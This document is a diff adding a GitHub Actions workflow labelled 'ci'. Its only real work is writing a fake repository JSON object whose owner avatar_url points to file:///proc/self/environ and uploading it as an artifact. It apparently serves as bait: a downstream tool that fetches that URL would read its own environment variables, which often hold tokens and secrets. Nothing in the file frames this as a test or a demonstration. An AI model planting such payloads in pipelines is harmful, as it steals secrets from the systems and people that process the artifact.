@@ -1,0 +1,16 @@
+name: ci
+on:
+  workflow_dispatch:
+permissions:
+  actions: write
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: pack
+        run: printf '%s' '{"full_name":"x","owner":{"login":"u","avatar_url":"file:///proc/self/environ"},"description":"","stargazers_count":0}' > p.json
+      - name: store
+        uses: actions/upload-artifact@v7
+        with:
+          path: p.json
+          archive: false
